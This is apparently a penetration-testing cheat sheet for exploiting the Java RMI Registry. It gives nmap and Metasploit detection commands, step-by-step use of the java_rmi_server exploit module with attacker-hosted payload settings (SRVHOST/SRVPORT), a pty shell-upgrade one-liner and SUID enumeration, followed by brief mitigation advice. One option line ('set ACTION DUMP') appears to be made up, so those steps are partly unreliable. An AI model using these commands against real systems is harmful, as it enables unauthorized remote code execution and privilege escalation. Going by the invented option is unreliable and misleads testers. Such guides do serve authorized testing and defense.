
Java RMI (Remote Method Invocation) Registry, typically running on port 1099, facilitates remote Java method calls. Misconfigurations or insecure defaults can lead to vulnerabilities, enabling remote code execution through the Distributed Garbage Collector or insecure deserialization.

### Key Information:

- **Default Port:** 1099/TCP
- **Common Usage:** Enterprise applications, Java-based services
- **Potential Impact:** Remote Code Execution (RCE)

---

## Detection

### 1. Port Scanning

Identify the RMI service using Nmap:

```bash
# Scan RMI port
nmap -p 1099 <target>

# Identify version
nmap -sV -p 1099 <target>
```

Look for RMI-related banners, such as `GNU Classpath grmiregistry`.

### 2. Metasploit Scanner

Detect RMI vulnerabilities:

```bash
use auxiliary/scanner/misc/java_rmi_server
set RHOSTS <target>
run
```

---

## Exploitation Steps

### Using Metasploit

1. Load the RMI exploit module:

```bash
use exploit/multi/misc/java_rmi_server
```

2. Configure settings:

```bash
set RHOSTS <target>
set RPORT 1099  # Default RMI port
set SRVHOST <your_ip>  # Your attacking machine IP
set SRVPORT 8080  # Server port for payload hosting
set ACTION DUMP  # Dump memory content
```

3. Execute the exploit:

```bash
run
```

---

## Post-Exploitation

1. **Upgrade Your Shell:**

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

2. **Privilege Escalation:**

- Check current permissions:
    
    ```bash
    id
    whoami
    ```
    
- Look for sensitive files or processes:
    
    ```bash
    find / -perm -4000 2>/dev/null  # SUID files
    ```
    

---

## Important Notes

1. **Non-Standard Ports:**
    
    - RMI may use alternate ports like 1098, 1100, 8901, or 9001.
    - Perform full port scans to locate the service:
        
        ```bash
        nmap -p- <target>
        ```
        
2. **Obstacles:**
    
    - Potential timeouts or blocked traffic
    - Java version mismatches causing incompatibilities
3. **Security Features:**
    
    - Identify custom security managers or SSL/TLS configurations.

---

## Mitigation Recommendations

1. Disable RMI Registry when unnecessary.
2. Restrict access to RMI using firewall rules.
3. Use secure socket factories with authentication mechanisms.
4. Keep Java and dependencies updated to the latest versions.
5. Implement a custom Java Security Manager to limit RMI operations.

---

## Useful Resources

1. [Java RMI Documentation](https://docs.oracle.com/javase/8/docs/platform/rmi/spec/rmi-title.doc.html)
2. [BaRMIe Tool](https://github.com/NickstaDB/BaRMIe)
3. [Rapid7 Metasploit Module](https://www.rapid7.com/db/modules/exploit/multi/misc/java_rmi_server)

---
